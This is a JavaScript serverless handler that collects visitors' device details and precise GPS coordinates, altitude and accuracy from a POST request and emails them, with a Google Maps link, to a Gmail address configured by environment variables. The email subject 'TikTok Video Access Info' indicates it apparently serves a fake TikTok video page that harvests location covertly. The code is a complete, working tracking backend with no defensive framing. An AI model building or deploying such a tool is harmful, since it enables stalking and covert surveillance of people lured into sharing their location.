import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Only POST allowed");

  try {
    const {
      timestamp, osVersion, browser, referrer,
      latitude, longitude, accuracy, altitude, altitudeAccuracy
    } = req.body || {};

    const user = process.env.GMAIL_USER;
    const pass = process.env.GMAIL_APP_PASSWORD;
    const to = process.env.TO_EMAIL;

    if (!user || !pass || !to) {
      return res.status(500).send("Missing env vars: GMAIL_USER / GMAIL_APP_PASSWORD / TO_EMAIL");
    }

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: { user, pass },
    });

    let text =
      `Time: ${timestamp}\n` +
      `Device: ${osVersion}\n` +
      `Browser: ${browser}\n` +
      `Referrer: ${referrer}\n`;

    if (latitude && longitude) {
      text += `Latitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy}m\n`;
      text += `Altitude: ${altitude}\nAltitude Accuracy: ${altitudeAccuracy}m\n`;
      text += `Map: https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}\n`;
    } else {
      text += "Location: Not provided\n";
    }

    await transporter.sendMail({
      from: user,
      to,
      subject: "TikTok Video Access Info",
      text
    });

    return res.status(200).send("OK");
  } catch (err) {
    console.error("sendMail error:", err);
    return res.status(500).send(err?.message || "Server error");
  }
}
